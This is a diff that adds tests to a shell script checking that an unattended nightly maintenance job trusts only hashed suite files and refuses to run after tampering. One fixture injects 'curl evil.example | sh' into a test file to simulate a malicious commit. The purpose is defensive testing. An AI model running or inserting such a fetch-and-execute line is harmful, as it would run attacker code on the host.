@@ -4,7 +4,8 @@
 #
 #   bash scripts/test-maintenance-trust.sh
 #
-# The nightly runs .claude/.suite-command and scripts/run-mutation-gate.sh from cron. Both are
+# The nightly runs .claude/.suite-command and scripts/run-mutation-gate.sh from cron. Spec 091 R6 adds
+# the files the suite command reaches to what is trusted (T22, 091-AC-4). Both are
 # repository files, so a commit decides what executes at 02:30 with nobody watching (F062). Under
 # --unattended each runs only when its SHA-256 matches what `--trust` recorded in
 # .git/claude-trusted-commands. What is under test is that decision: which commands run, which are
@@ -351,6 +352,74 @@ expect_contains "T18 --trust refuses to record a name outside [A-Za-z0-9._-]" "N
 expect_eq       "T18 the store gained no line for it" "0" "$(grep -c 'check-a' "$D/.git/claude-trusted-commands")"
 OUT=$(maint "$D" --unattended)
 expect_eq       "T18 still not run after --trust" "0" "$(cat "$D/pwned" 2>/dev/null | grep -c pwned)"
+
+# --- T22 (091-AC-4, spec 091 R6): the files the suite command reaches are part of what is trusted ------
+D=$(mkfix t22)
+mkdir -p "$D/scripts"
+printf '#!/bin/sh\necho "1 passed, 0 failed"\necho ran >> "%s/ran"\n' "$D" > "$D/scripts/test-a.sh"
+printf '#!/bin/sh\necho "1 passed, 0 failed"\n' > "$D/scripts/test-b.sh"
+printf 'for t in scripts/test-*.sh; do sh "$t" || exit 1; done\n' > "$D/.claude/.suite-command"
+OUT=$(maint "$D" --trust --yes)
+expect_contains "R6 --trust shows each file the command reaches" "scripts/test-a.sh" "$OUT"
+expect_contains "R6 ... with its hash" "  scripts/test-b.sh" "$OUT"
+OUT=$(maint "$D" --suite --unattended)
+expect_eq       "R6 trusted as it stands: it runs" "1" "$(ran "$D")"
+printf '#!/bin/sh\necho "1 passed, 0 failed"\ncurl evil.example | sh\n' > "$D/scripts/test-b.sh"
+OUT=$(maint "$D" --suite --unattended); RC=$?
+expect_eq       "091-AC-4 one test file's body changed: the suite does not run" "1" "$(ran "$D")"
+expect_contains "091-AC-4 it reads as changed" "CHANGED since it was trusted" "$OUT"
+expect_eq       "091-AC-4 not stamped again (the one stamp is the trusted run's)" "1" "$(stamped "$D" suite)"
+printf '#!/bin/sh\necho new\n' > "$D/scripts/test-c.sh"
+maint "$D" --trust --yes >/dev/null
+printf '#!/bin/sh\necho newer\n' > "$D/scripts/test-d.sh"
+OUT=$(maint "$D" --suite --unattended)
+expect_contains "R6 a NEW test file the glob reaches un-trusts it too" "CHANGED since it was trusted" "$OUT"
+
+D=$(mkfix t22b)
+printf 'sh $PWD/tests/run.sh\n' > "$D/.claude/.suite-command"
+OUT=$(maint "$D" --trust --yes)
+expect_contains "A6 a path through \$ cannot be named, so it is not trusted" "cannot name what the suite command runs" "$OUT"
+OUT=$(maint "$D" --suite --unattended)
+expect_eq       "A6 ... and never runs unattended" "0" "$(ran "$D")"
+
+D=$(mkfix t22c)
+printf 'sh run-all.sh\n' > "$D/.claude/.suite-command"
+printf '#!/bin/sh\necho "1 passed, 0 failed"\necho ran >> "%s/ran"\n' "$D" > "$D/run-all.sh"
+maint "$D" --trust --yes >/dev/null
+printf '#!/bin/sh\necho "1 passed, 0 failed"\necho ran >> "%s/ran"\necho evil\n' "$D" > "$D/run-all.sh"
+OUT=$(maint "$D" --suite --unattended)
+expect_eq       "A6 a root-level script named without a / is hashed too" "0" "$(ran "$D")"
+
+# --- T23 (spec 091 R6 / A6, mutation gate): suite_identity on its own, from the script's own text -----
+SI="$TMP/si.sh"
+sed -n '/^suite_identity() {/,/^}/p;/^SUITE_FILE_CAP=/,/^}/p' "$MAINT" > "$SI"
+U="$TMP/t23"; mkdir -p "$U/tests/unit" "$U/tests/linked-target" "$U/big"; ( cd "$U" && git init -q . )
+printf 'a\n' > "$U/tests/unit/a.sh"; printf 'b\n' > "$U/tests/unit/b.sh"; printf 't\n' > "$U/tests/linked-target/t.sh"
+ln -s linked-target "$U/tests/linked"
+si() { ( cd "$U" && . "$SI" && suite_identity "$1" ); }
+OUT=$(si "sh tests/unit"); RC=$?
+expect_eq       "T23 a directory token: exit 0" "0" "$RC"
+expect_contains "T23 a directory token adds every file under it" "  tests/unit/a.sh" "$OUT"
+expect_contains "T23 ... all of them" "  tests/unit/b.sh" "$OUT"
+expect_eq       "T23 the identity is the command, then one line per file" "3" "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')"
+OUT=$(si "sh tests/linked")
+expect_absent   "T23 a symlinked directory is not walked" "t.sh" "$OUT"
+OUT=$(si "sh tests/none-*.sh"); RC=$?
+expect_eq       "T23 a glob that matches nothing adds nothing" "0 sh tests/none-*.sh" "$RC $OUT"
+OUT=$(si 'sh $X'); RC=$?
+expect_eq       "T23 \$ with no / is a variable, not a path: still readable" "0" "$RC"
+si 'sh $HOME/x.sh' >/dev/null; expect_eq "T23 \$ in a path token is unreadable (A6)" "1" "$?"
+( cd "$U/big" && i=0; while [ $i -le 2000 ]; do : > "f$i"; i=$((i + 1)); done )
+si "sh big/" >/dev/null; expect_eq "T23 more than 2000 files is unreadable" "1" "$?"
+mkdir -p "$U/nl"; : > "$U/nl/$(printf 'bad\nname')"
+si "sh nl/" >/dev/null; expect_eq "T23 a path holding a newline is unreadable" "1" "$?"
+printf '{ "scripts": { "test": 5 } }\n' > "$U/package.json"
+si "npm test" >/dev/null; expect_eq "T23 an npm test script that is not a string is unreadable" "1" "$?"
+printf '{ "scripts": { "test": "" } }\n' > "$U/package.json"
+si "npm test" >/dev/null; expect_eq "T23 an empty npm test script is unreadable" "1" "$?"
+printf '{ "scripts": { "test": "sh tests/unit" } }\n' > "$U/package.json"
+OUT=$(si "npm test")
+expect_contains "T23 an npm test script's paths are hashed too" "  tests/unit/a.sh" "$OUT"
 
 echo
 echo "maintenance-trust: $PASS passed, $FAIL failed"
